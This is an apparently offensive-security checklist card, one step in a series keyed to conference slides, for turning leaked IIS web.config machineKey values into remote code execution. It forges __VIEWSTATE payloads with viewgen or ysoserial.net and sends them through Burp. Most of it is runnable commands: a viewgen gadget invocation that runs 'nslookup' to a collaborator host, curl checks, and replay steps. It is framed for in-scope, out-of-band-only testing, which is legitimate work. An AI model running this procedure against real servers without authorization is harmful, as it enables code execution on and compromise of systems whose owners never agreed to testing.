# Batch 04 — machineKey → VIEWSTATE RCE

## FILL IN

```bash
TARGET="https://app.company.com"
PAGE="/SomePage.aspx"          # any .aspx that has __VIEWSTATE
OAST="xxxx.oastify.com"        # your collaborator host
# keys from web.config (batch 03):
VK="PASTE_validationKey_HEX"
DK="PASTE_decryptionKey_HEX"
```

## GOAL
With keys from `web.config`, forge VIEWSTATE and prove the server runs your command (OOB only).

## TIME
~1–2 hours

## YOU NEED
- `web.config` with machineKey (batch 03)
- RCE allowed in scope
- Collaborator (Burp OAST / interactsh / etc.)
- Tool: [viewgen](https://github.com/0xacb/viewgen) **or** ysoserial.net

---

## WHY (kid version) — matches the slide

Talk says: **if you can read web.config on IIS, you can almost always get RCE.**

1. Page sends a blob called `__VIEWSTATE`  
2. Server checks it with **validationKey** / **decryptionKey**  
3. Server unpacks it with **ObjectStateFormatter**  
4. Evil blob → runs code  

Chain: `VIEWSTATE → ObjectStateFormatter → RCE`  
Tool named on slide: **viewgen**

---

## DO THIS

### 1) Copy keys from web.config

```bash
grep -i machineKey web.config
```

You need lines like:

```xml
validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES"
```

Paste into `VK=` and `DK=` above. Note the alg names too.

### 2) Confirm the page uses VIEWSTATE

```bash
curl -sk "$TARGET$PAGE" | grep -o '__VIEWSTATE' | head
```

If nothing, try other `.aspx` pages from the site map.

### 3) Install viewgen (once)

```bash
# follow current README on https://github.com/0xacb/viewgen
# typical:
pip install viewgen
# or git clone and run as project docs say
viewgen --help
```

### 4) Generate payload (OAST only — no destructive cmds)

```bash
# EXAMPLE shape — flags change by tool version; always check: viewgen --help
# Concept from talk: keys in → gadget out
viewgen --validationkey "$VK" --decryptionkey "$DK" \
  --validationalg SHA1 --decryptionalg AES \
  -g "nslookup $OAST"
```

If your viewgen build uses different flags, copy the exact example from `viewgen --help` / README and only swap keys + OAST command.

**Fallback:** ysoserial.net ViewState generators (Windows) with same keys.

### 5) Send forged VIEWSTATE

In Burp Repeater:

1. Load a normal POST to `$PAGE` that already has `__VIEWSTATE=...`  
2. Replace `__VIEWSTATE` value with the forged blob  
3. Keep other fields if needed (`__VIEWSTATEGENERATOR`, etc.)  
4. Send  

**Win:** DNS/HTTP hit on OAST.

### 6) Write 3 lines

```text
VIEWSTATE page:
OOB: yes/no
Tool used:
```

---

## IF / THEN

| You see | You do |
|---------|--------|
| OAST hit | Critical finding — stop noisy tests |
| Fail + encryption on | Re-check decryptionKey + alg; try sticky session |
| No VIEWSTATE anywhere | Close card → **05** |

---

## NEXT
→ [05-dnspy-dependencies.md](./05-dnspy-dependencies.md)

**Slides:** 16–17 · tool: viewgen · research links on slide
